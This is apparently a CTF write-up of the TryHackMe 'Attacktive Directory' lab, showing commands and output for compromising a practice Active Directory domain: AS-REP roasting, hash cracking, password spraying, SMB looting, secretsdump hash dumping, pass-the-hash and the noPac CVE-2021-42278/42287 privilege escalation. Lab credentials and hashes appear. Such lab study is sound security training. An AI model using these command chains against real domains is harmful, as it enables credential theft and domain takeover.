---
title: TryHackMe - Attacktive Directory
categories: [TryHackMe, Active Directory]
date: 2022-01-09
tags: [ad/kerbrute/user-enum, ad/as-rep-roasting, ad/kerbrute/password-spray, ad/kerberoasting, tcp/139-445-smb/fileshare , ad/bloodhound, ad/evil-winrm, ad/secretsdump]
img_path: /Writeups/TryHackMe/Active Directory/Attacktive Directory/images/
image:
  src: Pasted%20image%2020220219220550.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon 

## NMAP Complete Scan

```
# Nmap 7.92 scan initiated Sun Jan  9 21:22:43 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/tryhackme/attacktivedirect/10.10.184.179/scans/_full_tcp_nmap.txt -oX /root/tryhackme/attacktivedirect/10.10.184.179/scans/xml/_full_tcp_nmap.xml 10.10.184.179
adjust_timeouts2: packet supposedly had rtt of -198855 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -198855 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -199486 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -199486 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -199952 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -199952 microseconds.  Ignoring time.
Nmap scan report for 10.10.184.179
Host is up, received user-set (0.30s latency).
Scanned at 2022-01-09 21:22:44 +08 for 771s
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-01-09 13:33:24Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2022-01-09T13:35:26+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-08T13:22:27
| Not valid after:  2022-07-10T13:22:27
| MD5:   7932 0bff f770 4fae e0c9 5c3b 55c7 f926
| SHA-1: 4ce0 2690 8a98 dfd1 3e31 3dfe b693 7eb6 3724 21d2
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQQQpoi70iW4FFKxKDkM1g7DANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yMjAxMDgxMzIyMjdaFw0yMjA3MTAxMzIyMjdaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAsyCckYH4HEU2s2Y3860Fw7z4YzVlyifMTDlZGTgWSAPG
| dRroXK+8etUETfB55Y4jLS2xjqkoJ90zuOfDJw5dsaK/HQk2WqwLxPgEa+swO2iQ
| TanHUjeCghBTbvuvia3JedAPVTH47W3/XOVD12zwBZSam668/UgEDBakYobjv6p/
| g8qyRjMGz/SXkbT2E5Hbg/H438FzrEKgE0Zca1cvh6YpeDv7Z92WPepIkwUL91tm
| uCDCryCL4ngULzxBCtXVpuO9oYi4qBAQ6Ry7Pl+fUVov1+TXEJKkOsPUgjtEUxuy
| rvW6JIxAMqi6unaySb6HIVO3srqkLCJc5A7ydxCZiQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABeQ
| s/DzdcGVl9LSiQdlKvFIsop1IUl2TUFCAFsbxnumn/dIIWJ8BvNeDlHzGbgHUHTD
| uXSmhW22GHszgwXc3+F7crX6Q+XgWnXH54O5M1a7JSBD/lf4h/65PLbqpmyeqbum
| LnF6SXKU/fNRARpH3bReHSu2L7WIb4jfY3aEJl8vlSYibDP3yjfOujVv5CMg1UBB
| RlwmU3upfJSSfSN23oxRM4+9AIhbkGlK4d3oCoQoROsknlNbBikdi44b5ZVjGBp+
| TCzCKL+STZ4bffNrTfsYMMYs57V9JM7LnIlKYqEliB90emLZd8gzPJ8fjr1fu3lL
| hA8fpkkca7brFq+ymlU=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-01-09T13:35:18+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
OS fingerprint not ideal because: maxTimingRatio (1.660000e+00) is greater than 1.4
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows Vista SP1 (91%), Microsoft Windows 10 1709 - 1803 (90%), Microsoft Windows 10 1809 - 1909 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 build 10586 - 14393 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=1/9%OT=53%CT=1%CU=31926%PV=Y%DS=2%DC=T%G=N%TM=61DAE4A7%P=x86_64-pc-linux-gnu)
SEQ(SP=109%GCD=1%ISR=10B%TS=U)
SEQ(SP=106%GCD=1%ISR=107%CI=I%TS=U)
OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-01-09T13:35:15
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13605/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64743/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40958/udp): CLEAN (Failed to receive data)
|   Check 4 (port 61357/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   329.20 ms 10.11.0.1
2   329.25 ms 10.10.184.179

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  9 21:35:35 2022 -- 1 IP address (1 host up) scanned in 773.53 seconds

```

## TCP/139,445 (SMB)

### Crackmapexec

```
crackmapexec smb $ip
```

![Attacktivedirect crackmapexec.png](Attacktivedirect%20crackmapexec.png)

### Enum4Linux

![](Pasted%20image%2020220219225515.png)

- Unable to enumerate any users.
- Domain Name AKA DNS Domain: `spookysec.local`
- FQDN: `AttacktiveDirectory.spookysec.local`

# Initial Foothold

## TCP/88 (Kerberos)

1. Enumerate [usernames](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) w/ kerbrute

	```
	~/tools/windows-binaries/AD/kerbrute userenum --dc $ip -d spookysec.local userlist.txt -o found_users.txt
	```

	![Pasted image 20220219214539.png](Pasted%20image%2020220219214539.png)

2. Grep usernames, remove repeated words

	```
	cat found_users.txt | cut -d ':' -f4 | cut -d '@' -f1 | cut -d ' ' -f2 | sort -u |uniq --ignore-case > found_users_grep.txt
	```

3. AS-REP Roasting w/ GetNPUsers.py

	```
	GetNPUsers.py spookysec.local/ -usersfile found_users_grep.txt -dc-ip=$ip
	```

	![Attacktivedirect AS-REP Roasting.png](Attacktivedirect%20AS-REP%20Roasting.png)

	- Out of all the enumerated users, only `svc-admin` has `pre-auth` disabled
4. Crack hash

	```
	hashcat -m 18200 AS-REP_hash.txt passwordlist.txt
	```

	![Attacktivedirect cracking AS-REP_HASH.png](Attacktivedirect%20cracking%20AS-REP_HASH.png)

	- svc-admin:management2005

## TCP/5985 (WinRM)

1. Could not WINRM w/ svc-admin:management2005

	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/scans]
	└─# crackmapexec winrm $ip -u 'svc-admin' -p 'management2005'
	SMB         10.10.15.180    5985   ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 (name:ATTACKTIVEDIREC) (domain:spookysec.local)
	HTTP        10.10.15.180    5985   ATTACKTIVEDIREC  [*] http://10.10.15.180:5985/wsman
	WINRM       10.10.15.180    5985   ATTACKTIVEDIREC  [-] spookysec.local\svc-admin:management2005
	```

## TCP/3389 (RDP)

1. RDP w/ svc-admin:management2005

	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/scans]
	└─# rdesktop -d spookysec.local -u 'svc-admin' -p 'management2005' $ip
	```

2. User Flag

	``` 
	TryHackMe{K3rb3r0s_Pr3_4uth}
	```

	![](Pasted%20image%2020220219231904.png)

# Privilege Escalation 

## Backup 

1. Password Spraying w/ kerbrute

	```
	~/tools/windows-binaries/AD/kerbrute passwordspray --dc $ip -d spookysec.local found_users_grep.txt management2005 -o password_spray_results.txt
	```

	![Attacktivedirect password spray.png](Attacktivedirect%20password%20spray.png)

	- Password (management2005) not reused elsewhere 
2. Kerberoasting w/ GetUserSPNs.py

	```
	GetUserSPNs.py spookysec.local/svc-admin:management2005 -dc-ip $ip -request
	```

	- Unable to find any SPN service accounts
3. Access `svc-admin` fileshares

	```
	smbmap -u 'svc-admin' -p 'management2005' -H $ip 
	```

	![Attactivedirect smbmap.png](Attactivedirect%20smbmap.png)

4. View `backup` directory

	```
	smbclient //$ip/backup -U 'svc-admin'
	```

	![Pasted image 20220219214804.png](Pasted%20image%2020220219214804.png)

5.  Get all files recursively from `backup` directory

	```
	smbclient //$ip/backup -U 'svc-admin' -c 'prompt;recurse;mget *'
	```

	![Attacktivedirect backup user creds.png](Attacktivedirect%20backup%20user%20creds.png)

	- backup@spookysec.local:backup2517860

## Domain Admin (a-spooks) - Secretsdump

1. Look for privilege escalation path w/ bloodhound

	```
	/usr/bin/neo4j start
	bloodhound-python -u backup -p backup2517860 -ns $ip -d spookysec.local -c All --zip
	```

	```
	# More complete syntax
	bloodhound-python -c All -u 'svc-admin' -p 'management2005' -gc 'ATTACKTIVEDIREC.spookysec.local' -dc 'AttacktiveDirectory.spookysec.local' -d 'spookysec.local' -ns $ip --zip
	```

	![](Pasted%20image%2020220219233046.png)

	- Both command works, use 1 only
2. Bloodhound Analysis
	- Setup
	![](Pasted%20image%2020220219225605.png)
	- Results:
		![](Pasted%20image%2020220219203013.png)
		![](Pasted%20image%2020220219225659.png)
3. User backup@spookysec.local has `GenericAll` over the domain controller, allowing us to dump hashes on domain w/ secretsdump

	```
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/bloodhound]
	└─# impacket-secretsdump 'spookysec.local/backup@10.10.58.30' -just-dc -outputfile secrets_dump_hash.txt
	```

	![](Pasted%20image%2020220219233158.png)

4. Extract only NTLM hash

	```
	cat secrets_dump_hash.txt.ntds | cut -d ':' -f4
	```

5. Check if we can access SMB/WinRM w/ a-spooks:0e0363213e37b94221497260b0bcb4fc

	```
	crackmapexec smb/winrm $ip -u 'a-spooks' -H '0e0363213e37b94221497260b0bcb4fc'
	```

	![](Pasted%20image%2020220219213031.png)

6. Access via evil-winrm to obtain flags

	```
	evil-winrm -u 'a-spooks' -H '0e0363213e37b94221497260b0bcb4fc' -i $ip
	```

	![](Pasted%20image%2020220219212526.png)

	![](Pasted%20image%2020220219213758.png)

7. Root Flag
	![](Pasted%20image%2020220220000101.png)
	

## Domain Admin - CVE-2021-42278 & CVE-2021-42287

1. This exploit allows us to privilege escalate from any domain user to a domain administrator
	- svc-admin -> Domain Admin
2. Download exploit

	``` 
	git clone https://github.com/Alh4zr3d/sam-the-admin.git
	```

3. Download scanner

	``` 
	git clone https://github.com/Ridter/noPac.git
	```

4. Run scanner

	``` 
	┌──(root💀kali)-[~/tools/noPac]
	└─# python3 scanner.py spookysec.local/svc-admin:'management2005' -dc-ip $ip -use-ldap

	███    ██  ██████  ██████   █████   ██████ 
	████   ██ ██    ██ ██   ██ ██   ██ ██      
	██ ██  ██ ██    ██ ██████  ███████ ██      
	██  ██ ██ ██    ██ ██      ██   ██ ██      
	██   ████  ██████  ██      ██   ██  ██████ 



	[*] Current ms-DS-MachineAccountQuota = 10
	[*] Got TGT with PAC from 10.10.58.30. Ticket size 1530
	[*] Got TGT from AttacktiveDirectory.spookysec.local. Ticket size 733
	```

5. Run the exploit

	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
	└─# python3 sam_the_admin.py -dc-ip $ip spookysec.local/svc-admin:management2005
	Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

	[-] WARNING: Target host is not a DC
	[*] Selected Target attacktivedirectory.spookysec.local
	[*] Total Domain Admins 2
	[*] will try to impersonate Administrator
	[*] Current ms-DS-MachineAccountQuota = 10
	[*] Adding Computer Account "CTHULHU-FHTAGN-38$"
	[*] MachineAccount "CTHULHU-FHTAGN-38$" password = dRP0p0Q3gnM#
	[*] Successfully added machine account CTHULHU-FHTAGN-38$ with password dRP0p0Q3gnM#.
	[*] CTHULHU-FHTAGN-38$ object = CN=CTHULHU-FHTAGN-38,CN=Computers,DC=spookysec,DC=local
	[*] CTHULHU-FHTAGN-38$ sAMAccountName == attacktivedirec
	[*] Saving ticket in attacktivedirec.ccache
	[*] Resting the machine account to CTHULHU-FHTAGN-38$
	[*] Restored CTHULHU-FHTAGN-38$ sAMAccountName to original value
	[*] Using TGT from cache
	[*] Impersonating Administrator
	[*] 	Requesting S4U2self
	[*] Saving ticket in Administrator.ccache
	[*] You can deploy a shell when you want using the following command:
	[$] KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-smbexec -target-ip 10.10.58.30 -dc-ip 10.10.58.30 -k -no-pass @'attacktivedirectory.spookysec.local'
	[*] Deleting Computer Account "CTHULHU-FHTAGN-38$"
	[*] MachineAccount "CTHULHU-FHTAGN-38$" password = dRP0p0Q3gnM#
	Kerberos auth requires DNS name of the target DC. Use -dc-host.
	```

6. Obtain a shell w/ smbexec

	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
	└─# KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-smbexec -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local
	```

	![](Pasted%20image%2020220219205600.png)

7. Or dump hashes w/ secretsdump

	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
	└─# KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-secretsdump -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local
	```

	![](Pasted%20image%2020220219215222.png)

8. Explanation of exploit
	- https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds
	- https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
